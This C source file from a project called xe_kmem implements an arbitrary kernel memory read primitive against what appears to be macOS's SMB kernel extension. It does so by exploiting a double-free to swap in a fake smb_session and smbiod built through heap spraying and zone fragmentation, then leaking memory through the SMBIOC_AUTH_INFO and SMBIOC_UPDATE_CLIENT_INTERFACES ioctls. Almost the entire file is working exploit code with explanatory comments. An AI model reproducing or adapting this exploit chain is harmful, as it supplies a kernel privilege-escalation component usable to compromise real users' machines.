//
//  kmem_read_session.c
//  xe_kmem
//
//  Created by admin on 2/22/22.
//

#include <assert.h>
#include <stdio.h>
#include <limits.h>

#include <arpa/inet.h>

#include <xe/util/assert.h>
#include <xe/util/log.h>

#include "memory/allocator_nrnw.h"
#include "memory/kheap_alloc.h"
#include "smb/client.h"
#include "smb/params.h"

#include "kmem_read_session.h"

#define NUM_KEXT_32_FRAGMENTED_PAGES 1024


/*
 * The ioctl command `SMBIOC_AUTH_INFO` ia used for reading the authentication
 * info used during SMB session setup. The authentication info is stored in
 * memory pointed by `iod->iod_gss.gss_cpn` and `iod->iod_gss.gss_spn`. Their
 * lengths are stored in `iod->iod_gss.gss_cpn_len` and `iod->iod_gss.gss_spn_len`
 * respectively, where `iod` is of type `struct smbiod`. If we can get write
 * access to any of these pointers and their lengths, we can achieve arbitary memory
 * read.
 *
 * The aribitary kernel memory reader implementation below works by constructing a
 * fake smb_session (`struct smb_session`) pointing to a fake iod (`struct smbiod`).
 * The memory/zkext_alloc_small allocator.c can be used for allocating controlled data
 * in kernel memory (upto 256 bytes) and the address of allocated memory will be returned.
 * This allocator can be used for constructing `fake_smb_session` and `fake_iod`.
 * The double free vulnerability expolited in `smb_dev_rw.c` can be used to achieve
 * slow read / write access to a smb dev (`struct smb_dev`) stored in kext.48 zone.
 * By replacing the value of pointer `smb_dev->sd_session` to the the created fake
 * smb_session, we can achieve arbitary kernel memory read. The fake_iod pointed by
 * `fake_session->iod_tailq_head.tqh_first` will have the value of `fake_iod->iod_gss.gss_cpn`
 * set to the address of kernel memory from where data is to be read and
 * `fake_iod->iod_gss.gss_cpn_len` set to the length of data to be read from memory.
 * Then the data from kernel memory can then be read using SMBIOC_AUTH_INFO ioctl command
 *
 * Inorder to avoid having to construct new fake smb_session and fake iod for each
 * kernel memory read (which is slow and may fail), we set the value of pointer
 * `fake_session->session_interface_table.client_nic_info_list.tqh_first` to address of
 * `fake_iod->iod_gss.gss_spn`. This allows us to update the value of fields
 * `fake_iod->iod_gss.gss_cpn` and `fake_iod->iod_gss.gss_cpn_len` by executing the
 * ioctl command of type SMBIOC_UPDATE_CLIENT_INTERFACES, providing us with a reliable
 * and fast arbitary kernel memory reader.
 */


struct kmem_read_session {
    struct xe_kheap_alloc_entry sock_addr_alloc;
    struct xe_kheap_alloc_entry sock_addr_entry_alloc;
    struct xe_kheap_alloc_entry iod_alloc;
    struct xe_kheap_alloc_entry session_alloc;
    
    uintptr_t sock_addr_addr;
    uintptr_t sock_addr_entry_addr;
    uintptr_t iod_addr;
    uintptr_t nic_entry_addr;
    uintptr_t session_addr;
};


// We will be performing a lot of OOB reads from kext.32 zone for reading the address
// of socket addresses allocated using SMBIOC_UPDATE_CLIENT_INTERFACES ioctl command.
// Fragmenting the kext.32 zone will help us avoid kernel data abort panics due to bad
// OOB read in page boundary.
void kmem_read_session_fragment_kext_32(const struct sockaddr_in* smb_addr, kmem_allocator_nrnw_t nrnw_allocator) {
    kmem_allocator_nrnw_t gap_allocator = kmem_allocator_nrnw_create(smb_addr);
    for (int i=0; i<NUM_KEXT_32_FRAGMENTED_PAGES; i++) {
        kmem_allocator_nrnw_allocate(nrnw_allocator, 32, 2);
        kmem_allocator_nrnw_allocate(gap_allocator, 32, (XE_PAGE_SIZE / 32) - 2);
    }
    kmem_allocator_nrnw_destroy(&gap_allocator);
}


// Build a fake socket address. The value of `client_nic_info_list.tqh_first->addr_list.tqh_head->addr`
// will be set to the address of allocated fake socket address, where `client_nic_info_list`
// equals `fake_session->session_interface_table.client_nic_info_list`
void kmem_read_session_build_sock_addr(kmem_read_session_t session, const struct sockaddr_in* smb_addr) {
    xe_assert_cond(session->sock_addr_addr, ==, 0);
    
    /// xe_kheap_alloc reads the address of allocated memory by reading the field `addr` of  `struct sock_addr_entry`
    /// allocated in kext.32 zone. Since there may be other `sock_addr_entry` with `addr` pointing to different data, we need a way to
    /// distinguish others from our allocation. To do this we set the size of allocated data to 224 which will get allocated in kext.224 zone.
    /// Now we can distinguish others by checking whether the leaked `sock_addr_entry->addr & (PAGE_SIZE - 1)` value is divisible by 224
    struct xe_kheap_alloc_entry entry = xe_kheap_alloc(smb_addr, 224, AF_INET, (char*)&FAKE_SESSION_NIC_ADDR, sizeof(FAKE_SESSION_NIC_ADDR), 8);
    
    /// First 8 bytes of the allocated memory is used for storing actual socket address (sin_len, sin_family, sin_port etc.)
    uintptr_t fake_sock_addr_addr = entry.address + 8;
    
    session->sock_addr_addr = fake_sock_addr_addr;
    session->sock_addr_alloc = entry;
    xe_log_debug("allocated fake_sock_addr at: %p", (void*)fake_sock_addr_addr);
}


// Build a fake sock_addr_entry. The value of `client_nic_info_list.tqh_first->addr_list.tqh_head`
// will be set to the address of allocated fake sock_addr_entry, where `client_nic_info_list`
// equals `fake_session->session_interface_table.client_nic_info_list`
void kmem_read_session_build_sock_addr_entry(kmem_read_session_t session, const struct sockaddr_in* smb_addr) {
    xe_assert(session->sock_addr_addr != 0);
    xe_assert_cond(session->sock_addr_entry_addr, ==, 0);
    
    struct sock_addr_entry saddr_entry;
    bzero(&saddr_entry, sizeof(saddr_entry));
    saddr_entry.addr = (struct sockaddr*)session->sock_addr_addr;
    
    /// Allocating on kext.160 to identify the correct address. See notes in kmem_read_session_build_sock_addr function
    struct xe_kheap_alloc_entry entry = xe_kheap_alloc(smb_addr, 160, AF_INET, (char*)&saddr_entry, sizeof(saddr_entry), 8);
    
    /// First 8 bytes of allocated memory is used for storing actual socket address
    uintptr_t fake_sock_addr_entry_addr = entry.address + 8;
    
    session->sock_addr_entry_alloc = entry;
    session->sock_addr_entry_addr = fake_sock_addr_entry_addr;
    xe_log_debug("allocated fake_sock_addr_entry at: %p", (void*)fake_sock_addr_entry_addr);
}


// Builds the fake smbiod. The value of `fake_session->iod_tailq_head.tqh_first` will be set to
// the address of allocated fake smbiod. The construction of fake_iod is a bit complicated because
// the `struct smbiod` has size 704 but we can only allocate upto 256 bytes using zkext_alloc_small.
// The fields `iod_ref_cnt`, `iod_gss`, `iod_flags` and `iod_session` are used in the code path
// handling `SMBIOC_AUTH_INFO` ioctl command. All these fields cannot be incorporated into a single
// 256 byte data allocation. Hence the function below aligns the data such that if the
// allocated fake_iod is preceeded by another fake_iod, it is valid. Since the zkext_alloc_small
// make a lot of allocations using same data to read the allocated address, it is likely to have a
// fake_iod predecessor. In the rare event that the predecessor is not a fake_iod, the
// `fake_iod->iod_flags` will likely have invalid value which will lead to `SMBIOC_AUTH_INFO` command
// from returning EINVAL without triggering a panic.
void kmem_read_session_build_iod(kmem_read_session_t session, const struct sockaddr_in* smb_addr) {
    xe_assert(session->sock_addr_entry_addr != 0);
    xe_assert_cond(session->iod_addr, ==, 0);
    
    struct smbiod fake_iod;
    bzero(&fake_iod, sizeof(fake_iod));
    
    static_assert(offsetof(struct smbiod, iod_tdata) % 8 == 0, "");
    size_t fake_iod_start = offsetof(struct smbiod, iod_tdata);
    size_t fake_iod_end = fake_iod_start + 248;
    
    /// Firrst 8 bytes of the allocated data is used for storing the actual socket address
    /// Mark this area so that assertion below will fail when this area is used by any required fields
    *((uintptr_t*)((char*)&fake_iod + fake_iod_start - 8)) = 0xabcdef1234567890;
    
    assert(fake_iod_start <= 248);
    assert(offsetof(struct smbiod, iod_gss.gss_spn) >= fake_iod_start);
    assert(offsetof(struct smbiod, iod_gss.gss_spn) + offsetof(struct complete_nic_info_entry, addr_list.tqh_first) + 8 < fake_iod_end);
    /// The value of pointer `fake_session->session_interface_table.client_nic_info_list.tqh_first` is set to address of
    /// `fake_iod->iod_gss.gss_spn`. This is done to so that the value of `fake_iod->iod_gss.gss_cpn` and
    /// `fake_iod->iod_gss.gss_cpn_len` can be changed using  `SMBIOC_UPDATE_CLIENT_INTERFACES` ioctl command
    struct complete_nic_info_entry* fake_nic_entry = (struct complete_nic_info_entry*)((char*)&fake_iod + offsetof(struct smbiod, iod_gss.gss_spn));
    assert(fake_nic_entry->nic_index == 0);
    assert(fake_nic_entry->addr_list.tqh_first == 0);
    fake_nic_entry->nic_index = FAKE_SESSION_NIC_INDEX;
    fake_nic_entry->addr_list.tqh_first = (struct sock_addr_entry*)session->sock_addr_entry_addr;
    
    assert(offsetof(struct smbiod, iod_ref_cnt) >= fake_iod_start);
    assert(offsetof(struct smbiod, iod_ref_cnt) + sizeof(uint32_t) < fake_iod_end);
    assert(fake_iod.iod_ref_cnt == 0);
    fake_iod.iod_ref_cnt = 1;
    
    /// Make sure iod_flags and iod_session is provided by the predecessor fake_iod
    assert(offsetof(struct smbiod, iod_flags) < fake_iod_start);
    assert(offsetof(struct smbiod, iod_session) < fake_iod_start);
    /// Sets fields required by succeeding fake_iod
    struct smbiod* next_fake_iod = (struct smbiod*)((char*)&fake_iod + 256);
    /// It is okay to have iod_session == NULL, but  if it is not NULL it should be a valid address
    assert(next_fake_iod->iod_session == 0);
    assert(next_fake_iod->iod_flags == 0);
    next_fake_iod->iod_flags |= SMBIOD_RUNNING;
    
    struct xe_kheap_alloc_entry fake_iod_alloc = xe_kheap_alloc(smb_addr, 255, AF_INET, (char*)&fake_iod + fake_iod_start, 255 - 8, 8);
    uintptr_t fake_iod_addr = fake_iod_alloc.address + 8 - fake_iod_start;
    
    session->iod_alloc = fake_iod_alloc;
    session->iod_addr = fake_iod_addr;
    session->nic_entry_addr = fake_iod_addr + offsetof(struct smbiod, iod_gss.gss_spn);
    xe_log_debug("allocated fake_iod at: %p", (void*)fake_iod_addr);
    xe_log_debug("memory for fake_iod allocated at: %p", (void*)fake_iod_alloc.address);
    xe_log_debug("using fake_nic_entry addr: %p", (void*)session->nic_entry_addr);
}


// Builds the fake smb_session. The `struct smb_session` is larger than 256 bytes, but
// the fields used when codepaths handling `SMBIOC_AUTH_INFO` and `SMBIOC_UPDATE_CLIENT_INTERFACES`
// can be represented using a kext.224 allocation. This fake smb_session will be set as the value
// of pointer `smb_dev->sd_session` by exploiting double free vulnerability using smb_dev_rw.c
void kmem_read_session_build_session(kmem_read_session_t session, const struct sockaddr_in* smb_addr) {
    xe_assert(session->iod_addr != 0);
    xe_assert(session->nic_entry_addr != 0);
    xe_assert_cond(session->session_addr, ==, 0);
    
    char kmem_read_session[216];
    bzero(kmem_read_session, sizeof(kmem_read_session));
    uintptr_t base = TYPE_SMB_SESSION_MEM_IOD_TAILQ_LOCK_OFFSET;
    
    /// Setup fake_session->iod_tailq_lock (of type lck_mtx_t)
    *((uint64_t*)kmem_read_session + 1) = 0x22000000;
    /// Setup fake_session->iod_tailq_head
    *((uint64_t*)(kmem_read_session + TYPE_SMB_SESSION_MEM_IOD_TAILQ_HEAD_OFFSET - base)) = session->iod_addr;
    
    /// Setup fake_session->session_interface_table
    struct session_network_interface_info* fake_nic_info = (struct session_network_interface_info*)(kmem_read_session + TYPE_SMB_SESSION_MEM_SESSION_INTERFACE_TABLE_OFFSET - base);
    fake_nic_info->interface_table_lck.opaque[1] = 0x22000000; /// lck_mtx_t
    fake_nic_info->client_nic_count = 1;
    fake_nic_info->client_nic_info_list.tqh_first = (struct complete_nic_info_entry*)session->nic_entry_addr;
    
    static_assert((TYPE_SMB_SESSION_MEM_SESSION_INTERFACE_TABLE_OFFSET + offsetof(struct session_network_interface_info, client_if_blacklist_len) - TYPE_SMB_SESSION_MEM_IOD_TAILQ_LOCK_OFFSET) <= sizeof(kmem_read_session), "");
    
    /// Allocating on kext.224 to identify the correct address. See notes in kmem_read_session_build_sock_addr function
    struct xe_kheap_alloc_entry kmem_read_session_alloc = xe_kheap_alloc(smb_addr, 224, AF_INET, kmem_read_session, sizeof(kmem_read_session), 8);
    uintptr_t kmem_read_session_addr = kmem_read_session_alloc.address + 8 - base;
    
    session->session_alloc = kmem_read_session_alloc;
    session->session_addr = kmem_read_session_addr;
    xe_log_debug("allocated kmem_read_session at: %p", (void*)kmem_read_session_addr);
    xe_log_debug("memory for kmem_read_session allocated at: %p", (void*)kmem_read_session_alloc.address);
}


kmem_read_session_t kmem_read_session_create(const struct sockaddr_in* smb_addr) {
    kmem_allocator_nrnw_t nrnw_allocator = kmem_allocator_nrnw_create(smb_addr);
    kmem_read_session_fragment_kext_32(smb_addr, nrnw_allocator);
    
    kmem_read_session_t kmem_read_session = malloc(sizeof(struct kmem_read_session));
    bzero(kmem_read_session, sizeof(struct kmem_read_session));
    
    kmem_allocator_nrnw_allocate(nrnw_allocator, 32, XE_PAGE_SIZE / 32 * 16);
    kmem_read_session_build_sock_addr(kmem_read_session, smb_addr);
    kmem_allocator_nrnw_allocate(nrnw_allocator, 32, XE_PAGE_SIZE / 32 * 16);
    kmem_read_session_build_sock_addr_entry(kmem_read_session, smb_addr);
    kmem_allocator_nrnw_allocate(nrnw_allocator, 32, XE_PAGE_SIZE / 32 * 16);
    kmem_read_session_build_iod(kmem_read_session, smb_addr);
    kmem_allocator_nrnw_allocate(nrnw_allocator, 32, XE_PAGE_SIZE / 32 * 16);
    kmem_read_session_build_session(kmem_read_session, smb_addr);
    
    kmem_allocator_nrnw_destroy(&nrnw_allocator);
    return kmem_read_session;
}

int kmem_read_session_read(kmem_read_session_t session, int smb_dev_fd, void* dst, uintptr_t src, size_t size) {
    xe_assert_cond(size, <=, UINT32_MAX);
    
    
    /// Make sure fake_iod has a valid predecessor. see notes above method `kmem_read_session_build_iod`
    int error = smb_client_ioc_auth_info(smb_dev_fd, NULL, 0, NULL, 0, NULL);
    if (error) {
        xe_assert_cond(error, ==, EINVAL);
        return error;
    }
    
    struct network_nic_info nic_info;
    bzero(&nic_info, sizeof(nic_info));
    nic_info.nic_index = FAKE_SESSION_NIC_INDEX;
    /// Updates fake_iod->iod_gss->gss_cpn_len
    nic_info.nic_link_speed = ((uint64_t)size) << 32;
    /// Updates fake_iod->iod_gss->gss_cpn
    nic_info.nic_caps = (uint32_t)((uintptr_t)src);
    nic_info.nic_type = (uint32_t)((uintptr_t)src >> 32);
    memcpy(&nic_info.addr, &FAKE_SESSION_NIC_ADDR, sizeof(FAKE_SESSION_NIC_ADDR));
    
    error = smb_client_ioc_update_client_interface(smb_dev_fd, &nic_info, 1);
    xe_assert_err(error);
    
    error = smb_client_ioc_auth_info(smb_dev_fd, dst, (uint32_t)size, NULL, 0, NULL);
    xe_assert_err(error);
    return 0;
}

uintptr_t kmem_read_session_get_addr(kmem_read_session_t session) {
    xe_assert(session->session_addr != 0);
    return session->session_addr;
}

void kmem_read_session_destroy(kmem_read_session_t* session_p) {
    kmem_read_session_t session = *session_p;
    kmem_allocator_prpw_destroy(&session->sock_addr_alloc.element_allocator);
    kmem_allocator_prpw_destroy(&session->sock_addr_entry_alloc.element_allocator);
    kmem_allocator_prpw_destroy(&session->iod_alloc.element_allocator);
    kmem_allocator_prpw_destroy(&session->session_alloc.element_allocator);
    free(session);
    *session_p = NULL;
}
